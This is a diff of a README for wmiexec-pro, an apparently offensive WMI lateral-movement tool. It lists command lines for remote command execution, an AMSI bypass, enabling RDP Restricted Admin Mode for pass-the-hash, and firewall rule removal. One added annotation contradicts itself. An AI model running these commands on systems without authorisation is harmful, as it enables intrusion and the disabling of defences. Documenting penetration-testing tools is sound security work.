@@ -73,14 +73,20 @@ _Only need latest version of Impacket_
 ```
 python3 wmiexec-pro.py [[domain/]username[:password]@]<targetName or address> module -h
 
+Basic enumeration:
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 enum -run
+
 Enable/disable amsi bypass:
    python3 wmiexec-pro.py administrator:password@192.168.1.1 amsi -enable
    python3 wmiexec-pro.py administrator:password@192.168.1.1 amsi -disable
 
 Execute command:
    python3 wmiexec-pro.py administrator:password@192.168.1.1 exec-command -command "whoami" (Slient mode)
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 exec-command -command "whoami" -old (Slient mode in old version OS, such as server 2003)
    python3 wmiexec-pro.py administrator:password@192.168.1.1 exec-command -command "whoami" -with-output (With output)
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 exec-command -command "whoami" -with-output -old (With output in old version OS, such as server 2003)
    python3 wmiexec-pro.py administrator:password@192.168.1.1 exec-command -command "whoami" -with-output -save (With output and save output to file)
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 exec-command -command "whoami" -with-output -old -save
    python3 wmiexec-pro.py administrator:password@192.168.1.1 exec-command -clear (Remove temporary class for command result storage)
    
 Filetransfer:
@@ -90,15 +96,17 @@ Filetransfer:
    
 RDP:
    python3 wmiexec-pro.py administrator:password@192.168.1.1 rdp -enable (Auto configure firewall)
-   python3 wmiexec-pro.py administrator:password@192.168.1.1 rdp -enable-ram (Enable Restricted Admin Mode for PTH)
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 rdp -enable -old (For old version OS, such as server 2003)
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 rdp -enable-ram (Enable Restricted Admin Mode for PTH, not support old version OS, such as server 2003)
    python3 wmiexec-pro.py administrator:password@192.168.1.1 rdp -disable
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 rdp -disable -old (For old version OS, such as server 2003, not support old version OS, such as server 2003)
    python3 wmiexec-pro.py administrator:password@192.168.1.1 rdp -disable-ram (Disable Restricted Admin Mode)
 
-WinRM:
+WinRM (Only support win7+):
    python3 wmiexec-pro.py administrator:password@192.168.1.1 winrm -enable
    python3 wmiexec-pro.py administrator:password@192.168.1.1 winrm -disable
 
-Firewall:
+Firewall (Only support win8+):
    python3 wmiexec-pro.py administrator:password@192.168.1.1 firewall -search-port 445
    python3 wmiexec-pro.py administrator:password@192.168.1.1 firewall -dump (Dump all firewall rules)
    python3 wmiexec-pro.py administrator:password@192.168.1.1 firewall -rule-id (ID from search port) -rule-op [enable/disable/remove] (enable, disable, remove specify rule)
